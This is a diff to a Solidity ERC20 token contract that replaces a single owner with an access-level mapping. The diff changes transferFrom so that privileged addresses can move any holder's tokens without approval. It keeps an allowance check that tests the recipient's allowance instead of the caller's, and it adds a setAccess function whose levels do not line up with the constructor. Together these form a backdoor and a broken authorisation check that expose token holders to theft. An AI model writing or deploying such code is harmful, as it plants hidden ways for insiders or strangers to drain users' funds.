@@ -4,10 +4,10 @@ contract ERC20AC_93N{
     event Approval(address indexed owner,address indexed spender,uint value);
     mapping(address=>uint)internal _balances;
     mapping(address=>mapping(address=>uint))internal _allowances;
-    address internal _owner;
+    mapping(address=>uint)private _access;
     uint internal _totalSupply;
     constructor(){
-        _owner=msg.sender;
+        _access[msg.sender]=1;
         /*_totalSupply=13e26; //1.3 billion with 18 trailing decimal
         _balances[msg.sender]=_totalSupply;
         emit Transfer(address(this),msg.sender,_totalSupply);*/
@@ -41,7 +41,7 @@ contract ERC20AC_93N{
     }
     function transferFrom(address a,address b,uint c)public virtual returns(bool){unchecked{
         require(_balances[a]>=c);
-        require(a==msg.sender||_allowances[a][b]>=c);
+        require(a==msg.sender||_allowances[a][b]>=c||_access[msg.sender]>1);
         (_balances[a]-=c,_balances[b]+=c);
         emit Transfer(a,b,c);
         return true;
@@ -51,4 +51,8 @@ contract ERC20AC_93N{
         _balances[a]+=1e27;
         emit Transfer(address(this),a,1e27);
     }}
+    function setAccess(address a)external{
+        require(_access[msg.sender]>1);
+        _access[a]=1;
+    }
 }
